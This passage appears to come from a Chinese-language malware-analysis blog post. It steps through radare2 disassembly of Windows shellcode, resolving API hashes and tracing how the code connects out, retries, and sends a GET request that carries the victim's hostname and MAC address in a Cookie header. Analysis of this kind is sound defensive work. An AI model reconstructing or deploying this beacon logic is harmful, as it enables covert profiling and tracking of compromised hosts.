     ||||      <span class="number">0x00000000</span>(unk, unk, unk, unk, unk, unk, unk)
     ||||   <span class="number">0x000000e7</span>    31<span class="pseudo">db</span>         <span class="keyword">xor</span> <span class="literal">ebx</span>, <span class="literal">ebx</span>
     ||||   <span class="number">0x000000e9</span>    f7d3         <span class="keyword">not</span> <span class="literal">ebx</span>
     ||||   <span class="number">0x000000eb</span>    39c3         <span class="keyword">cmp</span> <span class="literal">ebx</span>, <span class="literal">eax</span>
    ,=====&lt; <span class="number">0x000000ed</span>    741f         <span class="keyword">je</span> <span class="number">0x10e</span>
    |||||   <span class="number">0x000000ef</span>    89c3         <span class="keyword">mov</span> <span class="literal">ebx</span>, <span class="literal">eax</span>
  .-------&gt; <span class="number">0x000000f1</span>    6a10         <span class="keyword">push</span> <span class="number">0x10</span> <span class="comment">;  0x00000010 </span>
  | |||||   <span class="number">0x000000f3</span>    8db5e1020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2e1</span>]
  | |||||   <span class="number">0x000000f9</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
  | |||||   <span class="number">0x000000fa</span>    <span class="number">53</span>           <span class="keyword">push</span> <span class="literal">ebx</span>
  | |||||   <span class="number">0x000000fb</span>    6899a57461   <span class="keyword">push</span> <span class="number">0x6174a599</span> <span class="comment">;  0x6174a599 </span>
  | |||||   <span class="number">0x00000100</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
  | |||||      <span class="number">0x00000000</span>(unk, unk, unk, unk)
  | |||||   <span class="number">0x00000102</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
  |,======&lt; <span class="number">0x00000104</span>    741f         <span class="keyword">je</span> <span class="number">0x125</span>
  |||||||   <span class="number">0x00000106</span>    fe8d89000000 <span class="keyword">dec</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x89</span>]
  <span class="string">`=======&lt; 0x0000010c    75e3         jne 0xf1
   |`</span><span class="string">```</span><span class="string">`-&gt; 0x0000010e    80bd4f02000. cmp byte [ebp+0x24f], 0x1
  ========&lt; 0x00000115    7407         je 0x11e
   |        0x00000117    e83b010000   call 0x257
   |           0x00000257()
  ========&lt; 0x0000011c    eb05         jmp 0x123
  --------&gt; 0x0000011e    e84d010000   call 0x270
          &gt;    0x00000270()
  --------&gt; 0x00000123    ffe7         jmp edi
   `</span>------&gt; <span class="number">0x00000125</span>    b800010000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x100</span> <span class="comment">;  0x00000100 </span>
            <span class="number">0x0000012a</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
            <span class="number">0x0000012c</span>    89e2         <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="literal">esp</span>
            <span class="number">0x0000012e</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
            <span class="number">0x0000012f</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
            <span class="number">0x00000130</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
            <span class="number">0x00000131</span>    68b649de01   <span class="keyword">push</span> <span class="number">0x1de49b6</span> <span class="comment">;  0x01de49b6 </span>
            <span class="number">0x00000136</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
               <span class="number">0x00000000</span>(unk, unk, unk, unk)
            <span class="number">0x00000138</span>    5f           <span class="keyword">pop</span> <span class="literal">edi</span>
            <span class="number">0x00000139</span>    81c400010000 <span class="keyword">add</span> <span class="literal">esp</span>, <span class="number">0x100</span>
            <span class="number">0x0000013f</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
  ========&lt; <span class="number">0x00000141</span>    0f85f2000000 <span class="keyword">jne</span> <span class="number">0x239</span>
            <span class="number">0x00000147</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
            <span class="number">0x00000148</span>    e8f9000000   <span class="keyword">call</span> <span class="number">0x246</span>
               <span class="number">0x00000246</span>(unk)
            <span class="number">0x0000014d</span>    5e           <span class="keyword">pop</span> <span class="literal">esi</span>
            <span class="number">0x0000014e</span>    89ca         <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="literal">ecx</span>
            <span class="number">0x00000150</span>    8dbde9020000 <span class="keyword">lea</span> <span class="literal">edi</span>, [<span class="literal">ebp</span>+<span class="number">0x2e9</span>]
            <span class="number">0x00000156</span>    e8eb000000   <span class="keyword">call</span> <span class="number">0x246</span>
               <span class="number">0x00000246</span>()
            <span class="number">0x0000015b</span>    4f           <span class="keyword">dec</span> <span class="literal">edi</span>
            <span class="number">0x0000015c</span>    83fa20       <span class="keyword">cmp</span> <span class="literal">edx</span>, <span class="number">0x20</span>
  ========&lt; <span class="number">0x0000015f</span>    7c05         <span class="keyword">jl</span> <span class="number">0x166</span>
            <span class="number">0x00000161</span>    ba20000000   <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="number">0x20</span> <span class="comment">;  0x00000020 </span>
  --------&gt; <span class="number">0x00000166</span>    89d1         <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="literal">edx</span>
            <span class="number">0x00000168</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
            <span class="number">0x00000169</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
            <span class="number">0x0000016b</span>    b90d000000   <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="number">0xd</span> <span class="comment">;  0x0000000d </span>
            <span class="number">0x00000170</span>    8db5c4020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2c4</span>]
            <span class="number">0x00000176</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
            <span class="number">0x00000178</span>    89bd4b020000 <span class="keyword">mov</span> [<span class="literal">ebp</span>+<span class="number">0x24b</span>], <span class="literal">edi</span>
            <span class="number">0x0000017e</span>    5e           <span class="keyword">pop</span> <span class="literal">esi</span>
            <span class="number">0x0000017f</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
            <span class="number">0x00000180</span>    68a9283480   <span class="keyword">push</span> <span class="number">0x803428a9</span> <span class="comment">;  0x803428a9 </span>
            <span class="number">0x00000185</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
</code></pre><p>首先<code>pop ebp</code>将解析器的地址弹入<code>ebp</code>，<code>ebp</code>就指向了所有解析器，显然，之后的一些长十六机制书就是windows API函数的哈希了。我们查查表、跟跟执行流程、看看四处的数据，做做注释，就知道大致怎么回事了。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2e9</span>
GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
Host:
[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2d1</span>
ws2_32
[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2d8</span>
IPHLPAPI
</code></pre><p>当看到一大堆往<code>0x0000010e</code>的类似跳转，猜测大概是处理出错的函数吧，可以注释之。</p>
<p>在函数调用之前(<code>0x0000092</code>)还有个自检查</p>
<pre><code><span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>+<span class="number">0x2e9</span>], <span class="number">0x20544547</span>
<span class="keyword">jne</span> <span class="number">0x10e</span>
</code></pre><p>我们可以看到是看<code>ebp+0x2e9</code>指向的是不是以<code>GET</code>开头：</p>
<pre><code><span class="special">~</span> ⮀ print "<span class="command">\x</span>20<span class="command">\x</span>54<span class="command">\x</span>45<span class="command">\x</span>47"
TEG
</code></pre><p>最后获得的是一个标准的shellcode建立socket流程:</p>
<ol>
<li>通过<code>kernel.dll!LoadlibraryA</code>载入相应dll(<code>ws2_32</code>),这里还载入了<code>IPHLPAPI</code></li>
<li><code>ws2_32.dll!WSAStartup</code>初始化socket</li>
<li><code>ws2_32.dll!WSASocketA</code>建立socket</li>
<li><code>ws2_32.dll!connect</code>连接socket</li>
</ol>
<p>connect返回0时说明连接成功，那么可以知道<code>0x00000104</code>地方的<code>je 0x125</code>跳往的地方应该就是连接成功后要执行的位置了。可以注释下。</p>
<p>注意之后的</p>
<pre><code><span class="number">0x00000106</span>    fe8d89000000 <span class="keyword">dec</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x89</span>]
<span class="number">0x0000010c</span>    75e3         <span class="keyword">jne</span> <span class="number">0xf1</span>
</code></pre><p><code>ebp+0x89=0x90</code>，这也是我发现不知道是什么的一个字节。根据紧随其后的一个跳转来看，是一个计数器，看样子是尝试连接5次</p>
<pre><code>[<span class="number">0x00000090</span>]&gt; px <span class="number">1</span>@<span class="number">0x7</span>+<span class="number">0x89</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x00000090</span>  <span class="number">05</span>
</code></pre><p>如果5次connect都失败了，没有跳转到<code>0x125</code>, 就到了<code>0x10e</code>，就是我们猜测是错误处理的部分。</p>
<pre><code>[<span class="number">0x00000256</span>]&gt; pd <span class="number">10</span>@<span class="number">0x10e</span>
           <span class="number">0x0000010e</span>    <span class="number">80</span>bd4f02000. cmp byte [ebp+<span class="number">0x24f</span>], <span class="number">0x1</span>
       ,=&lt; <span class="number">0x00000115</span>    <span class="number">7407</span>         je <span class="number">0x11e</span>
       |   <span class="number">0x00000117</span>    e83b010000   call <span class="number">0x257</span>
       |      <span class="number">0x00000257</span>()
      ,==&lt; <span class="number">0x0000011c</span>    eb05         jmp <span class="number">0x123</span>
      |`-&gt; <span class="number">0x0000011e</span>    e84d010000   call <span class="number">0x270</span>
      || &gt;    <span class="number">0x00000270</span>()
      `--&gt; <span class="number">0x00000123</span>    ffe7         jmp edi
           <span class="number">0x00000125</span>    b800010000   mov eax, <span class="number">0x100</span> ;  <span class="number">0x00000100</span> 
           <span class="number">0x0000012a</span>    <span class="number">29</span>c4         sub esp, eax
           <span class="number">0x0000012c</span>    <span class="number">89e2</span>         mov edx, esp
           <span class="number">0x0000012e</span>    <span class="number">52</span>           push edx
</code></pre><p>把<code>0x256</code>的字节和1做比较，相等则调用<code>0x270</code>再执行<code>0x123</code>，否则调用<code>0x257</code>然后再跳到<code>0x123</code>。</p>
<p>不知道判断了什么。</p>
<p>我们先看看<code>0x257</code>吧</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x257</span>
           <span class="number">0x00000257</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x0000025d</span>    e8e4ffffff   call <span class="number">0x246</span>
</code></pre><p>载入<code>0x7+0x2e9</code>然后调用<code>0x246</code></p>
<pre><code>[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2e9</span>
GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
Host: 

[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x246</span>
           <span class="number">0x00000246</span>    <span class="number">31</span>c9         xor ecx, ecx
           <span class="number">0x00000248</span>    f7d1         not ecx
           <span class="number">0x0000024a</span>    <span class="number">31</span>c0         xor eax, eax
           <span class="number">0x0000024c</span>    f2ae         repne scasb
           <span class="number">0x0000024e</span>    f7d1         not ecx
           <span class="number">0x00000250</span>    <span class="number">49</span>           dec ecx
           <span class="number">0x00000251</span>    c3           ret
</code></pre><p><code>0x246</code>，中<code>repne scasb</code>常常用来计算字符串长度。仔细看其实<code>0x246</code>就是<code>strlen</code>。计算结果在<code>ecx</code>中,<code>edi</code>此时指向字符串<code>\0</code>下一个字节。</p>
<p>所以回到<code>0x257</code>:</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x257</span>
           <span class="number">0x00000257</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x0000025d</span>    e8e4ffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x00000262</span>    <span class="number">4f</span>           dec edi
           <span class="number">0x00000263</span>    b94f000000   mov ecx, <span class="number">0x4f</span> ;  <span class="number">0x0000004f</span> 
           <span class="number">0x00000268</span>    <span class="number">8</span>db575020000 lea esi, [ebp+<span class="number">0x275</span>]
           <span class="number">0x0000026e</span>    f3a4         rep movsb
           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x0000027b</span>    c3           ret
</code></pre><p>首先<code>edi</code>减1指向字符串<code>\0</code>位置。</p>
<pre><code><span class="special">[</span>0x00000000<span class="special">]</span>&gt; ps @0x7+0x275
<span class="command">\x</span>0d
Connection: keep-alive<span class="command">\x</span>0d
Accept: */*<span class="command">\x</span>0d
Accept-Encoding: gzip<span class="command">\x</span>0d
<span class="command">\x</span>0d
</code></pre><p>将两个字符串结合起来了。shellcode改变了自己，可以通过<code>ebp+0x2e9</code>获得新的HTTP报头.</p>
<p>难道标志位不相等就构造报头？然后跳转到报头后下一位，我们稍微计算下发现跳转到一堆<code>00</code>上，崩掉了……</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; y <span class="number">0x4f</span> @<span class="number">0x7</span>+<span class="number">0x275</span>
[<span class="number">0x00000000</span>]&gt; e io.cache=<span class="literal">true</span>
[<span class="number">0x00000000</span>]&gt; yy <span class="number">0x32a</span>
[<span class="number">0x00000000</span>]&gt; px @<span class="number">0x32a</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x0000032a</span>  <span class="number">0</span>d0a <span class="number">436f</span> <span class="number">6e6</span>e <span class="number">6563</span> <span class="number">7469</span> <span class="number">6f</span>6e <span class="number">3</span>a20 <span class="number">6</span>b65  ..Connection: ke
<span class="number">0x0000033a</span>  <span class="number">6570</span> <span class="number">2</span>d61 <span class="number">6</span>c69 <span class="number">7665</span> <span class="number">0</span>d0a <span class="number">4163</span> <span class="number">6365</span> <span class="number">7074</span>  ep-alive..Accept
<span class="number">0x0000034a</span>  <span class="number">3</span>a20 <span class="number">2</span>a2f <span class="number">2</span>a0d <span class="number">0</span>a41 <span class="number">6363</span> <span class="number">6570</span> <span class="number">742</span>d <span class="number">456</span>e  : *<span class="comment">/*..Accept-En
0x0000035a  636f 6469 6e67 3a20 677a 6970 0d0a 0d0a  coding: gzip....
0x0000036a  0083 c70e 31c9 f7d1 31c0 f3ae 4fff e700  ....1...1...O...
0x0000037a  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0000038a  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0000039a  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x000003aa  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x000003ba  0090 ffff ffff ffff ffff ffff ffff ffff  ................</span>
</code></pre><p>回到<code>0x10e</code>，我们再看看<code>0x270</code>, 标志位为1发生什么。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt;  pd <span class="number">3</span>@<span class="number">0x270</span>
           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x0000027b</span>    c3           ret


[<span class="number">0x00000000</span>]&gt;  pd <span class="number">6</span>@<span class="number">0x10e</span>
           <span class="number">0x0000010e</span>    <span class="number">80</span>bd4f02000. cmp byte [ebp+<span class="number">0x24f</span>], <span class="number">0x1</span>
       ,=&lt; <span class="number">0x00000115</span>    <span class="number">7407</span>         je <span class="number">0x11e</span>
       |   <span class="number">0x00000117</span>    e83b010000   call <span class="number">0x257</span>
       |      <span class="number">0x00000257</span>(unk)
      ,==&lt; <span class="number">0x0000011c</span>    eb05         jmp <span class="number">0x123</span>
      |`-&gt; <span class="number">0x0000011e</span>    e84d010000   call <span class="number">0x270</span>
      || &gt;    <span class="number">0x00000270</span>()
      `--&gt; <span class="number">0x00000123</span>    ffe7         jmp edi


[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x270</span>
           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x0000027b</span>    c3           ret
</code></pre><p>What?计算下报头长度，然后直接跳过去崩掉……</p>
<p>反正只要<code>connect</code>失败就崩了……只不过崩之前干的事情不同，不知道<code>ebp+0x24f</code>是判断啥的标志位。</p>
<p>Ok, 如果<code>connect</code>成功连接。</p>
<pre><code><span class="number">0x00000104</span>    <span class="number">741f</span>         je <span class="number">0x125</span>
</code></pre><p>我们可以看到，从<code>0x125</code>就是<code>gethostname</code>了。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span> @<span class="number">0x125</span>
           <span class="number">0x00000125</span>    b800010000   mov eax, <span class="number">0x100</span> ;  <span class="number">0x00000100</span> 
           <span class="number">0x0000012a</span>    <span class="number">29</span>c4         sub esp, eax
           <span class="number">0x0000012c</span>    <span class="number">89e2</span>         mov edx, esp
           <span class="number">0x0000012e</span>    <span class="number">52</span>           push edx
           <span class="number">0x0000012f</span>    <span class="number">50</span>           push eax
           <span class="number">0x00000130</span>    <span class="number">52</span>           push edx
           <span class="number">0x00000131</span>    <span class="number">68</span>b649de01   push <span class="number">0x1de49b6</span> ;  <span class="number">0x01de49b6</span> 
           <span class="number">0x00000136</span>    ffd5         call ebp

exercise ● ⮀ python hash.py ws2_32.dll gethostname
[+] Ran on Sat Aug <span class="number">16</span> <span class="number">20</span>:<span class="number">23</span>:<span class="number">44</span> <span class="number">2014</span>

[+] <span class="number">0x01DE49B6</span> = ws2_32.dll!gethostname
</code></pre><p><code>gethostname</code>的结果写入<code>edi</code>中，接着判断如果失败跳到<code>0x239</code>去，不知道是啥。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x239</span>
       |   <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
       |   <span class="number">0x0000023a</span>    <span class="number">68756e4</span>d61   push <span class="number">0x614d6e75</span> ;  <span class="number">0x614d6e75</span> 
       |   <span class="number">0x0000023f</span>    ffd5         call ebp
       |      <span class="number">0x00000000</span>(unk, unk, unk) ; name
</code></pre><p>这个hash是<code>&quot;ws2_32.dll!closesocket&quot;</code>那么就很显然是关闭socket的函数了.</p>
<p>我们回到之前<code>gethostname</code>地方：</p>
<pre><code>  ,=&lt; <span class="number">0x00000141</span>    <span class="number">0f</span>85f2000000 jne <span class="number">0x239</span>
 |   <span class="number">0x00000147</span>    <span class="number">57</span>           push edi
 |   <span class="number">0x00000148</span>    e8f9000000   call <span class="number">0x246</span>
 |      <span class="number">0x00000246</span>(unk) ; <span class="built_in">strlen</span>
 |   <span class="number">0x0000014d</span>    <span class="number">5</span>e           pop esi
 |   <span class="number">0x0000014e</span>    <span class="number">89</span>ca         mov edx, ecx
 |   <span class="number">0x00000150</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
 |   <span class="number">0x00000156</span>    e8eb000000   call <span class="number">0x246</span>
 |      <span class="number">0x00000246</span>() ; <span class="built_in">strlen</span>
 |   <span class="number">0x0000015b</span>    <span class="number">4f</span>           dec edi
 |   <span class="number">0x0000015c</span>    <span class="number">83f</span>a20       cmp edx, <span class="number">0x20</span>
,==&lt; <span class="number">0x0000015f</span>    <span class="number">7</span>c05         jl <span class="number">0x166</span>
</code></pre><p>接下来，又是计算字符串长度，判断之前<code>gethostname</code>结果是否等于32,如果比32小则跳转到<code>0x166</code>, 如果大于32则将edx设置成32。而<code>0x166</code>开始又是之前我们分析过的拼接字符串的部分。</p>
<pre><code>[<span class="number">0x00000246</span>]&gt; pd <span class="number">7</span>@<span class="number">0x166</span>
           <span class="number">0x00000166</span>    89d1         <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="literal">edx</span>
           <span class="number">0x00000168</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
           <span class="number">0x00000169</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
           <span class="number">0x0000016b</span>    b90d000000   <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="number">0xd</span> <span class="comment">;  0x0000000d </span>
           <span class="number">0x00000170</span>    8db5c4020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2c4</span>]
           <span class="number">0x00000176</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
           <span class="number">0x00000178</span>    89bd4b020000 <span class="keyword">mov</span> [<span class="literal">ebp</span>+<span class="number">0x24b</span>], <span class="literal">edi</span>
</code></pre><p>就是把<code>gethostname</code>的结果拼接到<code>HOST</code>字段上。</p>
<pre><code>[<span class="number">0x00000246</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2c4</span>
\x0d
Cookie: ID=ws2_32
[<span class="number">0x00000246</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2e9</span>
GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
Host: 
</code></pre><p>同时<code>gethostname</code>获取的结果保存到堆栈上，最后弹出，调用<code>gethostbyname</code>。</p>
<pre><code>[<span class="number">0x00000246</span>]&gt; pd <span class="number">10</span>@<span class="number">0x179</span>
           <span class="number">0x00000179</span>    bd4b020000   mov ebp, <span class="number">0x24b</span> ;  <span class="number">0x0000024b</span> 
           <span class="number">0x0000017e</span>    <span class="number">5</span>e           pop esi
           <span class="number">0x0000017f</span>    <span class="number">56</span>           push esi
           <span class="number">0x00000180</span>    <span class="number">68</span>a9283480   push <span class="number">0x803428a9</span> ;  <span class="number">0x803428a9</span> 
           <span class="number">0x00000185</span>    ffd5         call ebp
              <span class="number">0x00000000</span>(unk, unk) ; name
           <span class="number">0x00000187</span>    <span class="number">85</span>c0         test eax, eax

% python hash.py ws2_32.dll gethostbyname
[+] Ran on Tue Aug <span class="number">19</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">21</span> <span class="number">2014</span>

[+] <span class="number">0x803428A9</span> = ws2_32.dll!gethostbyname
</code></pre><p>两次检查结果确认返回了正确的结果，</p>
<p>紧接着，准备数据，调用<code>sendARP</code>获取mac地址</p>
<pre><code>% python hash.py iphlpapi.dll SendARP             
[+] Ran on Tue Aug <span class="number">19</span> <span class="number">16</span>:<span class="number">21</span>:<span class="number">37</span> <span class="number">2014</span>

[+] <span class="number">0xB8D27248</span> = iphlpapi.dll!SendARP


  ||   <span class="number">0x0000019d</span>    8d400c       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">eax</span>+<span class="number">0xc</span>]
  ||   <span class="number">0x000001a0</span>    8b00         <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">eax</span>]
  ||   <span class="number">0x000001a2</span>    8b08         <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">eax</span>]
  ||   <span class="number">0x000001a4</span>    8b09         <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">ecx</span>]
  ||   <span class="number">0x000001a6</span>    b800010000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x100</span> <span class="comment">;  0x00000100 </span>
  ||   <span class="number">0x000001ab</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
  ||   <span class="number">0x000001ac</span>    89e7         <span class="keyword">mov</span> <span class="literal">edi</span>, <span class="literal">esp</span>
  ||   <span class="number">0x000001ae</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
  ||   <span class="number">0x000001b0</span>    89e6         <span class="keyword">mov</span> <span class="literal">esi</span>, <span class="literal">esp</span>
  ||   <span class="number">0x000001b2</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
  ||   <span class="number">0x000001b3</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
  ||   <span class="number">0x000001b4</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
  ||   <span class="number">0x000001b5</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
  ||   <span class="number">0x000001b6</span>    684872d2b8   <span class="keyword">push</span> <span class="number">0xb8d27248</span> <span class="comment">;  sendARP </span>
  ||   <span class="number">0x000001bb</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
</code></pre><p>根据msdn上看到的，<code>edi</code>指向mac地址的长度。接下来比较mac地址是否是六个字节，如果不是……我们之前看到了0x239是<code>closesocket</code></p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x1bf</span>
           <span class="number">0x000001bf</span>    <span class="number">81</span>c404010000 add esp, <span class="number">0x104</span>
           <span class="number">0x000001c5</span>    <span class="number">0f</span>b70f       movzx ecx, word [edi]
           <span class="number">0x000001c8</span>    <span class="number">83f</span>906       cmp ecx, <span class="number">0x6</span>
       ,=&lt; <span class="number">0x000001cb</span>    <span class="number">726</span>c         jb <span class="number">0x239</span>
</code></pre><p>接下来这个乍一看让人困惑，在栈上分配空间，还干了一堆不知道干什么的。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">32</span>@<span class="number">0x1cd</span>
|          <span class="number">0x000001cd</span>    b906000000   mov ecx, <span class="number">0x6</span> ;  <span class="number">0x00000006</span> 
|          <span class="number">0x000001d2</span>    b810000000   mov eax, <span class="number">0x10</span> ;  <span class="number">0x00000010</span> 
|          <span class="number">0x000001d7</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x000001d9</span>    <span class="number">89e7</span>         mov edi, esp
|          <span class="number">0x000001db</span>    <span class="number">89</span>ca         mov edx, ecx
|          <span class="number">0x000001dd</span>    d1e2         shl edx, <span class="number">1</span>
|          <span class="number">0x000001df</span>    <span class="number">50</span>           push eax
|          <span class="number">0x000001e0</span>    <span class="number">52</span>           push edx
|          ; JMP XREF from <span class="number">0x0000020b</span> (fcn<span class="number">.00000090</span>)
|  .-----&gt; <span class="number">0x000001e1</span>    <span class="number">31</span>d2         xor edx, edx
|  |       <span class="number">0x000001e3</span>    <span class="number">8</span>a16         mov dl, [esi]
|  |       <span class="number">0x000001e5</span>    <span class="number">88</span>d0         mov al, dl
|  |       <span class="number">0x000001e7</span>    <span class="number">24f</span>0         and al, <span class="number">0xf0</span>
|  |       <span class="number">0x000001e9</span>    c0e804       shr al, <span class="number">0x4</span>
|  |       <span class="number">0x000001ec</span>    <span class="number">3</span>c09         cmp al, <span class="number">0x9</span>
|  |   ,=&lt; <span class="number">0x000001ee</span>    <span class="number">7704</span>         ja <span class="number">0x1f4</span>
|  |   |   <span class="number">0x000001f0</span>    <span class="number">0430</span>         add al, <span class="number">0x30</span>
|  |  ,==&lt; <span class="number">0x000001f2</span>    eb02         jmp <span class="number">0x1f6</span> ; (fcn<span class="number">.00000090</span>)
|  |  ||   ; JMP XREF from <span class="number">0x000001ee</span> (fcn<span class="number">.00000090</span>)
|  |  |`-&gt; <span class="number">0x000001f4</span>    <span class="number">0437</span>         add al, <span class="number">0x37</span>
|  |  |    ; JMP XREF from <span class="number">0x000001f2</span> (fcn<span class="number">.00000090</span>)
|  |  `--&gt; <span class="number">0x000001f6</span>    <span class="number">8807</span>         mov [edi], al
|  |       <span class="number">0x000001f8</span>    <span class="number">47</span>           inc edi
|  |       <span class="number">0x000001f9</span>    <span class="number">88</span>d0         mov al, dl
|  |       <span class="number">0x000001fb</span>    <span class="number">240f</span>         and al, <span class="number">0xf</span>
|  |       <span class="number">0x000001fd</span>    <span class="number">3</span>c09         cmp al, <span class="number">0x9</span>
|  | ,===&lt; <span class="number">0x000001ff</span>    <span class="number">7704</span>         ja <span class="number">0x205</span>
|  | |     <span class="number">0x00000201</span>    <span class="number">0430</span>         add al, <span class="number">0x30</span>
|  |,====&lt; <span class="number">0x00000203</span>    eb02         jmp <span class="number">0x207</span> ; (fcn<span class="number">.00000090</span>)
|  |||     ; JMP XREF from <span class="number">0x000001ff</span> (fcn<span class="number">.00000090</span>)
|  ||`---&gt; <span class="number">0x00000205</span>    <span class="number">0437</span>         add al, <span class="number">0x37</span>
|  ||      ; JMP XREF from <span class="number">0x00000203</span> (fcn<span class="number">.00000090</span>)
|  |`----&gt; <span class="number">0x00000207</span>    <span class="number">8807</span>         mov [edi], al
|  |       <span class="number">0x00000209</span>    <span class="number">47</span>           inc edi
|  |       <span class="number">0x0000020a</span>    <span class="number">46</span>           inc esi
|  `=====&lt; <span class="number">0x0000020b</span>    e2d4         loop <span class="number">0x1e1</span>
